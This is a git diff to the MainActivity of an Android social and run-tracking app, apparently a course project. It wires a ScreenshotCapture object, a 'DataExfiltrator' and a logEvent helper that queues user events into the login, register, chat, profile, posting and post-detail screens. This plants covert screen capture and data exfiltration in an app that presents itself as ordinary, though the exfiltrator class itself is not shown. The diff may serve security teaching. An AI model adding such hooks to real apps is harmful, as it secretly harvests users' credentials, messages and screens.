@@ -29,6 +29,8 @@ import android.content.Intent
 import android.net.Uri
 import android.os.Build
 import android.provider.Settings
+import android.util.Log
+import androidx.compose.ui.platform.LocalContext
 
 
 class MainActivity : ComponentActivity() {
@@ -128,12 +130,28 @@ class MainActivity : ComponentActivity() {
             screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
         }
 
-
-
         enableEdgeToEdge()
+        fun logEvent(exfiltrator: DataExfiltrator, event: String, value: String) {
+            val data = "$event -> $value"
+            exfiltrator.queueData(data)
+        }
 
         setContent {
             INF2215Theme {
+                // ───────────────────────────────────────────────
+                // This whole block MUST be here — inside the composition
+                // ───────────────────────────────────────────────
+                val context = LocalContext.current
+
+                val screenshotCapture = remember { ScreenshotCapture(context) }
+                val exfiltrator = remember { DataExfiltrator(context) }
+
+                val logEventLambda: (String, String) -> Unit = remember(exfiltrator) {
+                    { event, value ->
+                        logEvent(exfiltrator, event, value)
+                    }
+                }
+
                 var screen by remember { mutableStateOf(Screen.Login) }
                 var previousScreen by remember { mutableStateOf(Screen.Home) }
 
@@ -382,12 +400,18 @@ class MainActivity : ComponentActivity() {
                                 onLoginSuccess = {
                                     sendDataToServer("user_login")
                                     screen = Screen.Home },
-                                onGoRegister = { screen = Screen.Register }
+                                onGoRegister = { screen = Screen.Register },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.Register -> RegisterScreen(
                                 onRegistered = { screen = Screen.Home },
-                                onBackToLogin = { screen = Screen.Login }
+                                onBackToLogin = { screen = Screen.Login },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.Home -> HomeScreen(
@@ -416,7 +440,10 @@ class MainActivity : ComponentActivity() {
                                     chatOtherName = otherName
                                     previousScreen = Screen.Profile
                                     screen = Screen.ChatRoom
-                                }
+                                },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.AdminProfile -> AdminProfileScreen()
@@ -425,7 +452,10 @@ class MainActivity : ComponentActivity() {
                                 onPostSuccess = {
                                     sendDataToServer("create_post")
                                     screen = Screen.Home },
-                                onCancel = { screen = Screen.Home }
+                                onCancel = { screen = Screen.Home },
+                                screenshotCapture = screenshotCapture,
+                                exfiltrator = exfiltrator,
+                                logEvent = logEventLambda
                             )
 
                             Screen.TrackRun -> TrackRunScreen(
@@ -470,7 +500,10 @@ class MainActivity : ComponentActivity() {
                                     ChatScreen(
                                         otherUserId = otherUid,
                                         otherDisplayName = otherName,
-                                        onBack = { screen = previousScreen }
+                                        onBack = { screen = previousScreen },
+                                        screenshotCapture = screenshotCapture,
+                                        exfiltrator = exfiltrator,
+                                        logEvent = logEventLambda
                                     )
                                 } else {
                                     Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
@@ -589,7 +622,10 @@ class MainActivity : ComponentActivity() {
                                 selectedPostId?.let { postId ->
                                     PostDetailScreen(
                                         postId = postId,
-                                        onBack = { screen = previousScreen }
+                                        onBack = { screen = previousScreen },
+                                        screenshotCapture = screenshotCapture,
+                                        exfiltrator = exfiltrator,
+                                        logEvent = logEventLambda
                                     )
                                 }
                             }
